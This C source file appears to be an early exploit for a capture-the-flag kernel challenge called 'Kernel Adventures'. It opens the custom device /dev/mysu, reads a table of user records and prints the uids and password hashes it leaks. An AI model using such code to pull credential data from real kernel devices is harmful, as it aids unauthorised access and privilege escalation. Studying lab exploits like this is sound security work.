#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

struct user {
    uint32_t uid;
    uint32_t password_hash;
} __attribute__((aligned(32)));

int main(int argc, char* argv[]) {
    printf("Kernel Adventures Part 1 Exploitinator v1.1\n");

    int mysu_fd = open("/dev/mysu", O_RDWR);
    if (mysu_fd == -1) {
        printf("Failed to open '/dev/mysu'\n");
        exit(1);
    }

    struct user users[4];
    ssize_t count = read(mysu_fd, users, sizeof(users));
    if (count != sizeof(users)) {
        printf("Failed to read '/dev/mysu'\n");
        exit(1);
    }

    printf("%d %d", users[0].uid, users[0].password_hash);
    printf("%d %d", users[1].uid, users[1].password_hash);

    return 0;
}
